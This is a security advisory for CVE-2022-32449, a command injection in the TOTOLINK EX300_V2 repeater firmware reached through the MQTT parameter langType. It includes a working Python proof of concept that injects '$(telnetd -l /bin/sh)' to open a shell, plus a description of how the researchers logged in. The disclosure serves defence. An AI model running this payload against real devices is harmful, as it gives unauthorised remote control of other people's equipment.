# CVE-ID

[CVE-2022-32449](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32449 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32449")

# Information

**Vendor of the products:**    TOTOLINK

**Vendor's website:**    [http://www.totolink.cn](http://www.totolink.cn "http://www.totolink.cn")

**Reported by:**    WangJincheng(<wjcwinmt@outlook.com>) & ShaLetian(<ltsha@njupt.edu.cn>)

**Affected products:**    [TOTOLINK EX300_V2](http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=55 "http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=55")

**Affected firmware version:**  V4.0.3c.7484

**Firmware download address:**  [http://www.totolink.cn/data/upload/20210720/b351052836a4fc7e1575dc513afc02b1.zip](http://www.totolink.cn/data/upload/20210720/b351052836a4fc7e1575dc513afc02b1.zip "http://www.totolink.cn/data/upload/20210720/b351052836a4fc7e1575dc513afc02b1.zip")

# Overview

`TOTOLINK EX300_V2 V4.0.3c.7484` has a command injection vulnerability detected at function `setLanguageCfg`. Attackers can send a `MQTT` data packet and inject evil commands into parameter `langType` to execute arbitrary commands.

# Show the product

`TOTOLINK EX300_V2` is a Wi-Fi repeater made in China.

![image](https://github.com/winmt/CVE/blob/main/TOTOLINK%20EX300_V2/pic/0.jpg)

# Vulnerability details

The vulnerability is detected at `/bin/cste_modules/global.so`.

In the function `setLanguageCfg`, the content obtained by program through parameter `langType` given by `MQTT` data packet is passed to variable `Var`. Then, the variable `Var` is formatted into `v9` through the function `sprintf` without any check. Finally, `v9` is passed as an argument to the function `CsteSystem` which can execute system commands.

![image](https://github.com/winmt/CVE/blob/main/TOTOLINK%20EX300_V2/pic/1.jpg)

Above all, attackers can send a `MQTT` data packet and inject evil commands into parameter `langType` to execute arbitrary commands.

# POC

```python
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.connect("192.168.0.254", 1883, 60)
client.publish("totolink/router/setLanguageCfg", '{"langType": "$(telnetd -l /bin/sh)"}')
```

# Get shell

At first, we run the above script to exploit the vulnerability.

Then, we scan ports and dectect that the port `23` which represents `Telnet service` has been opened.

![image](https://github.com/winmt/CVE/blob/main/TOTOLINK%20EX300_V2/pic/2.jpg)

Finally, we telnet into the Wi-Fi repeater through port `23` and control it successfully.

![image](https://github.com/winmt/CVE/blob/main/TOTOLINK%20EX300_V2/pic/3.jpg)
